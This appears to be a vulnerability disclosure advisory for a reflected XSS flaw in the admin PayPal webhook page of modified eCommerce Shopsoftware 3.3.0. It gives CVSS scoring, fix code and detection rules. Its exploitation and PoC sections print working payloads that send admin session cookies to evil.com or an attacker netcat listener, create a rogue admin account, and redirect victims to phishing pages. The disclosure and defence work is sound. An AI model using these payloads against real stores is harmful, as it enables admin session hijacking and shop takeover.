# Security Advisory — Reflected XSS in modified eCommerce Shopsoftware 3.3.0

| Field | Value |
| :---- | :---- |
| **Title** | Reflected Cross-Site Scripting (XSS) in `admin/paypal_webhook.php` |
| **Product** | modified eCommerce Shopsoftware |
| **Affected Version** | 3.3.0 (rev. r16825) — latest available version |
| **Component** | `admin/paypal_webhook.php` — GET parameter `id` on `action=edit` |
| **Type** | Reflected Cross-Site Scripting (XSS) |
| **CWE** | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Improper Neutralization of Input During Web Page Generation |
| **CAPEC** | [CAPEC-86](https://capec.mitre.org/data/definitions/86.html) — XSS via HTTP Query Strings |
| **CVSS 3.1 Score** | **6.1 (Medium)** — escalatable to **8.7 (High)** in targeted phishing scenario |
| **Base Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
| **Escalated Vector** | `CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RC:C` |
| **CVE ID** | Pending Assignment |
| **Discovered by** | Carlos Augusto Adriano Filho |
| **Discovery Date** | November 12, 2026 |
| **Publication Date** | November 12, 2026 |
| **Advisory Version** | 1.0 |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)  
2. [Affected Product and Version](#2-affected-product-and-version)  
3. [Technical Description](#3-technical-description)  
4. [Impact](#4-impact)  
5. [CVSS 3.1 and CWE Classification](#5-cvss-31-and-cwe-classification)  
6. [Exploitation Scenario](#6-exploitation-scenario)  
7. [Technical Evidence](#7-technical-evidence)  
8. [Proof of Concept (PoC)](#8-proof-of-concept-poc)  
9. [Reproduction Steps](#9-reproduction-steps)  
10. [Recommended Mitigations](#10-recommended-mitigations)  
11. [Fix Code](#11-fix-code)  
12. [Detection and Monitoring](#12-detection-and-monitoring)  
13. [Responsible Disclosure Timeline](#13-responsible-disclosure-timeline)  
14. [Vendor Communication](#14-vendor-communication)  
15. [Credits](#15-credits)  
16. [References](#16-references)  
17. [Revision History](#17-revision-history)  
18. [Legal Disclaimer](#18-legal-disclaimer)

---

## 1\. Executive Summary

A **Reflected Cross-Site Scripting (XSS)** vulnerability was identified in the administrative panel of **modified eCommerce Shopsoftware 3.3.0**, specifically at the endpoint `GET /admin/paypal_webhook.php?action=edit&id=`.

The **`id`** parameter is reflected directly into the HTML response without any encoding or sanitization, allowing injection of arbitrary JavaScript in the victim's browser context. An attacker can exploit this flaw to **steal administrator sessions, perform actions on behalf of the victim (CSRF-bypass), or redirect to malicious pages**.

The calculated CVSS 3.1 base score is **6.1 (Medium)**, escalatable to **8.7 (High)** in a targeted spear phishing attack against authenticated administrators.

---

## 2\. Affected Product and Version

| Field | Detail |
| :---- | :---- |
| **Product** | modified eCommerce Shopsoftware (modified-shop) |
| **Version** | 3.3.0 — revision r16825 (latest publicly available version) |
| **Language** | PHP 8.1.x |
| **Web Server** | Apache 2.4.x |
| **Repository** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
| **Vulnerable File** | `admin/paypal_webhook.php` |
| **Vulnerable Parameter** | `id` (via GET method, action=edit) |
| **Fixed Version** | ⚠️ None — no patch available as of this advisory's publication date |

---

## 3\. Technical Description

The endpoint `admin/paypal_webhook.php` processes PayPal notifications (IPN — Instant Payment Notification) and also exposes an edit form accessible via `?action=edit`. In this mode, the `id` parameter is read from `$_GET` and reflected **without encoding** directly into an `<input type="hidden">` field value via the `xtc_draw_hidden_field()` function.

### Vulnerable Data Flow

```
GET /admin/paypal_webhook.php?action=edit&id=<PAYLOAD>
                                               ↓
              $webhook_id = $_GET['id']   (no sanitization)
                                               ↓
  echo xtc_draw_hidden_field('config[id]', $_GET['id'])
                                               ↓
  <input type="hidden" name="config[id]" value="<PAYLOAD>">
                                               ↓
                    XSS executed in victim's browser
```

### Vulnerable Code

```php
// admin/paypal_webhook.php — line ~168 (action=edit mode)
// $_GET['id'] reflected without htmlspecialchars() or any encoding

echo xtc_draw_hidden_field('config[id]', $_GET['id']);
//                                        ^^^^^^^^^^
//                                        NO SANITIZATION
```

The `xtc_draw_hidden_field()` function generates directly:

```html
<input type="hidden" name="config[id]" value="VALUE_OF_$_GET['id']">
```

By injecting `"><script>alert(document.domain)</script>`, the generated field becomes:

```html
<input type="hidden" name="config[id]" value=""><script>alert(document.domain)</script>">
```

The script is immediately executed by the browser within the application's domain.

---

## 4\. Impact

| Dimension | Level | Description |
| :---- | :---- | :---- |
| **Confidentiality** | 🟡 Low → 🔴 High\* | Theft of `MODsid` session cookie via `document.cookie` |
| **Integrity** | 🟡 Low → 🔴 High\* | Arbitrary actions in the admin panel on behalf of the authenticated victim |
| **Availability** | ⚪ None | No direct impact on availability |

> \*Impact escalated in a scenario involving targeted spear phishing against administrators.

### Post-XSS Attack Vectors

- **Session Hijacking** — Extraction of the `MODsid` cookie via `document.cookie` to hijack the admin session  
- **Admin Action Forgery** — Execution of authenticated requests (create admin user, modify settings, change prices) in the context of the victim's session  
- **Credential Harvesting** — Injection of a fake re-authentication form to capture credentials  
- **Malicious Redirect** — `window.location` pointing to a phishing page  
- **Keylogging** — Keyboard capture within the administrative panel  
- **Vulnerability Chaining** — Combining with other vulnerabilities (CSRF, SSRF) for impact escalation

---

## 5\. CVSS 3.1 and CWE Classification

### Base Score: `6.1 (Medium)`

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
```

| Metric | Value | Rationale |
| :---- | :---- | :---- |
| **Attack Vector (AV)** | Network | Exploitation via link sent through any vector |
| **Attack Complexity (AC)** | Low | No special conditions — direct link |
| **Privileges Required (PR)** | None | The attacker does not need an account to craft the link |
| **User Interaction (UI)** | Required | The victim (admin) must click the malicious link |
| **Scope (S)** | Changed | The script executes in the victim's browser context |
| **Confidentiality (C)** | Low | Access limited to data within the session context |
| **Integrity (I)** | Low | Limited DOM context modifications |
| **Availability (A)** | None | No direct impact |

### Escalated Score (Admin Spear Phishing): `8.7 (High)`

```
CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RC:C
```

> In a scenario where the attacker already has access to the internal network and is authenticated as an admin, the impact is maximum (C:H/I:H/A:H) with changed scope, functional exploit (E:F) and confirmed (RC:C).

**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Improper Neutralization of Input During Web Page Generation (XSS)  
**CAPEC:** [CAPEC-86](https://capec.mitre.org/data/definitions/86.html) — XSS via HTTP Query Strings

> **Calculator (Base):** [https\://www\.first.org/cvss/calculator/3.1\#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

---

## 6\. Exploitation Scenario

```
[ Attacker ] → Crafts malicious URL with XSS payload
                    ↓
   http://[TARGET]/admin/paypal_webhook.php
     ?action=edit
     &id="><script>fetch('https://evil.com/?c='+document.cookie)</script>

[ Victim: Authenticated Admin ]
        ↓
   Receives link via e-mail, Slack, support ticket, etc.
        ↓
   Clicks the link while authenticated in the admin panel
        ↓
   Browser executes the script within the application's domain
        ↓
   MODsid cookie sent to attacker's server
        ↓
[ Attacker ] → Uses MODsid to hijack admin session
        ↓
   Full access to admin panel: products, orders, customers, settings
```

### Exploitation Variants

**Session theft (cookie exfiltration):**

```
?action=edit&id="><script>new Image().src='https://evil.com/?c='+document.cookie</script>
```

**Silent admin user creation (combined with CSRF):**

```
?action=edit&id="><script>
fetch('/admin/create_account.php',{method:'POST',
  body:'admin_name=hacker&admin_pass=pwned123&...',
  credentials:'include'})
</script>
```

**Redirect to phishing:**

```
?action=edit&id="><script>window.location='https://evil.com/fake-admin-login'</script>
```

---

## 7\. Technical Evidence

| Field | Confirmed Value |
| :---- | :---- |
| **Target URL** | `http://[TARGET]/admin/paypal_webhook.php?action=edit&id=` |
| **Method** | `GET` |
| **Vulnerable Parameter** | `id` |
| **Reflection Context** | `value` attribute of `<input type="hidden">` |
| **Responsible Function** | `xtc_draw_hidden_field('config[id]', $_GET['id'])` |
| **PHP** | 8.1.34 |
| **Apache** | 2.4.65 |
| **Confirmed Payload** | `"><script>alert(document.domain)</script>` |
| **Confirmed Output** | `alert(192.168.0.105)` ✅ |
| **Authentication Requirement** | Yes — active admin session (`MODsid`) |

### HTTP Request (Confirmed PoC)

```
GET /admin/paypal_webhook.php?action=edit&id=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: 192.168.0.105:8080
Cookie: MODsid=<SESSION_COOKIE>
```

### Generated HTML Snippet (Vulnerable Response)

```html
<!-- Generated by xtc_draw_hidden_field() without sanitization -->
<input type="hidden" name="config[id]"
  value=""><script>alert(document.domain)</script>">
```

---

## 8\. Proof of Concept (PoC)

> ⚠️ **For use in authorized environments only. Testing on production systems without authorization is illegal.**

### 8.1 — Browser Test (Basic Confirmation)

Access the URL below while authenticated in the admin panel. An `alert()` displaying the application's domain should appear:

```
http://[TARGET]/admin/paypal_webhook.php?action=edit&id="><script>alert(document.domain)</script>
```

### 8.2 — Cookie Exfiltration via curl

```sh
# 1. Set up collection server (attacker side)
nc -lvnp 8888

# 2. Send the following link to the victim (authenticated admin):
http://[TARGET]/admin/paypal_webhook.php?action=edit&id="><script>
new Image().src='http://[ATTACKER]:8888/?c='+encodeURIComponent(document.cookie)
</script>

# 3. MODsid cookie will be received by netcat:
# GET /?c=MODsid%3D13e2c3e504a610032f4ef95fc792835a HTTP/1.1
```

### 8.3 — Reflection Test via curl

```sh
# Checks whether the payload appears in the response without encoding
curl -s \
  'http://[TARGET]/admin/paypal_webhook.php?action=edit&id=XSSTEST' \
  -H 'Cookie: MODsid=<SESSION_COOKIE>' \
  | grep -o 'XSSTEST'

# Expected result: XSSTEST (confirming reflection without encoding)
```

### 8.4 — Advanced Payload (Session Hijack \+ Redirect)

```js
// Full payload: exfiltrates cookie AND redirects to phishing
"><script>
(function(){
  var c = document.cookie;
  var img = new Image();
  img.src = 'https://evil.com/steal?session=' + encodeURIComponent(c);
  setTimeout(function(){
    window.location = 'https://evil.com/fake-login';
  }, 100);
})();
</script>
```

---

## 9\. Reproduction Steps

**Prerequisites:** Valid administrator account in the panel. Active browser session (cookie `MODsid`).

1. **Login** — Access `http://[TARGET]/admin/` → fill in credentials → confirm authentication.  
     
2. **Build the Payload** — Create the URL with the `id` parameter containing the XSS payload:

```
http://[TARGET]/admin/paypal_webhook.php?action=edit&id="><script>alert(document.domain)</script>
```

3. **Access the URL** — Paste the URL into the browser while authenticated. The JavaScript will be executed immediately.  
     
4. **Confirm Execution** — The `alert()` will display the application's domain (e.g., `192.168.0.105`), confirming code execution in the browser context.  
     
5. **Validate Exfiltration** — To test cookie theft, replace the payload with the exfiltration one (Section 8.2) and monitor the collection server.

---

## 10\. Recommended Mitigations

### Immediate Fix

| Priority | Action |
| :---- | :---- |
| 🔴 **Critical** | Apply `htmlspecialchars()` to **all** reflected GET/POST parameters |
| 🔴 **Critical** | Validate and sanitize `$_GET['id']` before any output use |
| 🟠 **High** | Implement Content Security Policy (CSP) in the admin panel |
| 🟠 **High** | Add `HttpOnly` and `SameSite=Strict` flags to the `MODsid` cookie |
| 🟡 **Medium** | Full audit of all reflected parameters in the admin panel |

### Blue Team / DevSecOps Recommendations

- **Output Encoding** — Apply `htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, 'UTF-8')` to **all** variable output in HTML, regardless of its origin.  
- **Content Security Policy (CSP)** — Implement the header `Content-Security-Policy: default-src 'self'; script-src 'self'` to block unauthorized inline and external scripts.  
- **Cookie Security** — Add `HttpOnly` (prevents JavaScript access) and `SameSite=Strict` attributes to the `MODsid` session cookie.  
- **Input Validation** — Validate the expected format of the `id` parameter (numeric or UUID) and reject values that do not match the expected pattern.  
- **SAST** — Run static analysis (PHP\_CodeSniffer \+ PHPCS-Security-Audit) on all files reflecting `$_GET/$_POST/$_REQUEST` into HTML.  
- **Anti-Phishing Training** — Train administrators not to click on admin panel links received via unsolicited e-mail or messages.

---

## 11\. Fix Code

```php
// ──────────────────────────────────────────────────────────────
// VULNERABLE — admin/paypal_webhook.php (~line 168)
// ──────────────────────────────────────────────────────────────
echo xtc_draw_hidden_field('config[id]', $_GET['id']);
//                                        ^^^^^^^^^^
//                                        reflected WITHOUT encoding

// ──────────────────────────────────────────────────────────────
// FIXED — Option 1: htmlspecialchars directly on the parameter
// ──────────────────────────────────────────────────────────────
echo xtc_draw_hidden_field(
    'config[id]',
    htmlspecialchars($_GET['id'], ENT_QUOTES | ENT_HTML5, 'UTF-8')
);

// ──────────────────────────────────────────────────────────────
// FIXED — Option 2: sanitization with type validation
// ──────────────────────────────────────────────────────────────
$webhook_id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);

if ($webhook_id === false || $webhook_id === null) {
    // Invalid ID: reject and log the attempt
    error_log('[SECURITY] XSS attempt on paypal_webhook.php from ' . $_SERVER['REMOTE_ADDR']);
    http_response_code(400);
    exit('Invalid webhook ID.');
}

echo xtc_draw_hidden_field('config[id]', (int) $webhook_id);

// ──────────────────────────────────────────────────────────────
// FIXED — Option 3: fix in the xtc_draw_hidden_field() function
// (central fix — protects all hidden fields system-wide)
// ──────────────────────────────────────────────────────────────
function xtc_draw_hidden_field(string $name, $value, string $params = ''): string {
    return '<input type="hidden" name="'
        . htmlspecialchars($name,  ENT_QUOTES | ENT_HTML5, 'UTF-8') . '"'
        . ' value="'
        . htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, 'UTF-8') . '"'
        . ($params ? ' ' . $params : '')
        . '>' . PHP_EOL;
}
```

### Content Security Policy (Recommended)

```
# Apache — add to VirtualHost or admin panel .htaccess
<Location /admin/>
    Header always set Content-Security-Policy \
        "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';"
    Header always set X-XSS-Protection "1; mode=block"
    Header always set X-Content-Type-Options "nosniff"
</Location>
```

### Cookie Security (Recommended)

```php
// At admin panel session initialization
session_set_cookie_params([
    'lifetime' => 0,
    'path'     => '/admin/',
    'secure'   => true,         // requires HTTPS
    'httponly' => true,         // blocks document.cookie
    'samesite' => 'Strict',     // blocks cross-site CSRF
]);
session_start();
```

---

## 12\. Detection and Monitoring

### 12.1 — Apache Access Log Patterns

```sh
# Detect common XSS payloads in logs
grep -iE "(<script|javascript:|onerror=|onload=|alert\(|document\.cookie)" \
     /var/log/apache2/access.log

# Filter accesses to the vulnerable endpoint with suspicious parameters
grep 'paypal_webhook.php' /var/log/apache2/access.log | \
  grep -iE "id=.*(%3C|%22|%27|<|>|\"|\047)"
```

### 12.2 — Suricata IDS Rule

```
alert http $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
    msg:"XSS Attempt - modified-shop paypal_webhook action=edit";
    flow:established,to_server;
    http.method; content:"GET";
    http.uri; content:"/admin/paypal_webhook.php"; nocase;
    http.uri; content:"action=edit"; nocase;
    http.uri; pcre:"/id=[^&]*((%3C|<)script|javascript:|onerror|onload)/i";
    classtype:web-application-attack;
    sid:9900001; rev:1;
)
```

### 12.3 — ModSecurity (WAF)

```
SecRule REQUEST_URI "@contains /admin/paypal_webhook.php" \
    "id:9900004,phase:1,block,log,\
    msg:'Reflected XSS attempt on paypal_webhook',\
    chain"
    SecRule ARGS_GET:action "@streq edit" \
    "chain"
        SecRule ARGS_GET:id "@detectXSS" ""
```

### 12.4 — Cookie Exfiltration Monitoring (SIEM)

```
# Rule to detect cookie exfiltration via external GET parameters
# (Wazuh / Elastic SIEM)
Detect outbound requests from admin browser to external domains
with parameters containing strings similar to 'MODsid' or 'session='
where referer is /admin/paypal_webhook.php
```

---

## 13\. Responsible Disclosure Timeline

| Date | Event |
| :---- | :---- |
| `2026-11-12` | Vulnerability discovered during source code analysis — controlled lab environment |
| `2026-11-12` | Confirmed via browser: `alert(document.domain)` \= `192.168.0.105` ✅ |
| `2026-11-12` | Security Advisory version 1.0 written and published |
| `2026-11-12` | Vendor notified via GitHub Security Advisory / Issue |
| `Pending` | Awaiting vendor response to coordinate patch publication |
| `Pending` | CVE ID request in progress via MITRE/NVD |
| `TBD` | Vendor patch publication (date to be defined after coordination) |

> This advisory follows the **Coordinated Vulnerability Disclosure (CVD)** process as recommended by CERT/CC and ISO/IEC 29147:2018.

---

## 14\. Vendor Communication

| Field | Detail |
| :---- | :---- |
| **Vendor** | modified eCommerce Shopsoftware Community |
| **Repository** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
| **Contact Channel** | GitHub Security Advisories / Issues |
| **Status** | Notification sent on 2026-11-12. Awaiting response. |
| **SLA** | 90 days for coordinated publication (CVD Best Practices) |

---

## 15\. Credits

| Field | Detail |
| :---- | :---- |
| **Researcher** | Carlos Augusto Adriano Filho |
| **Role** | Senior Red Team Analyst |
| **Focus Areas** | Web App Pentesting · WAF Bypass · SAST/DAST · API Security |
| **Methodologies** | OWASP Testing Guide · PTES · NIST SP 800-115 |

---

## 16\. References

- [CWE-79 — Cross-site Scripting](https://cwe.mitre.org/data/definitions/79.html)  
- [CAPEC-86 — XSS via HTTP Query Strings](https://capec.mitre.org/data/definitions/86.html)  
- [CVSS 3.1 Specification](https://www.first.org/cvss/specification-document)  
- [OWASP — Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)  
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)  
- [OWASP Testing Guide — OTG-INPVAL-001](https://owasp.org/www-project-web-security-testing-guide/)  
- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)  
- [NVD — National Vulnerability Database](https://nvd.nist.gov)  
- [ISO/IEC 29147:2018 — Vulnerability Disclosure](https://www.iso.org/standard/72311.html)  
- [modified eCommerce Shopsoftware](https://github.com/modified-shop/modified-shop)  
- [NIST SP 800-115 — Technical Guide to Information Security Testing](https://csrc.nist.gov/publications/detail/sp/800-115/final)

---

## 17\. Revision History

| Version | Date | Author | Description |
| :---- | :---- | :---- | :---- |
| 1.0 | 2026-11-12 | Carlos Augusto Adriano Filho | Initial publication |

---

## 18\. Legal Disclaimer

> **LEGAL DISCLAIMER:** This advisory was prepared exclusively for educational and security purposes, in a controlled laboratory environment, with explicit authorization. The techniques and tools described are intended for security professionals for authorized penetration testing and vulnerability research purposes only.  
>   
> The use of the information, techniques, or tools described herein on systems **without explicit authorization is illegal and unethical**, and may result in criminal and civil liability.   
> This document follows the principles of **Responsible Disclosure** and was prepared in compliance with **Brazilian Law nº 12.737/2012** (Computer Crimes Act), **LGPD (Law nº 13.709/2018)** (Brazilian Data Protection Law), and the ethical guidelines of EC-Council, OWASP, and ISO/IEC 29147:2018.

---

*© 2026 Carlos Augusto Adriano Filho*
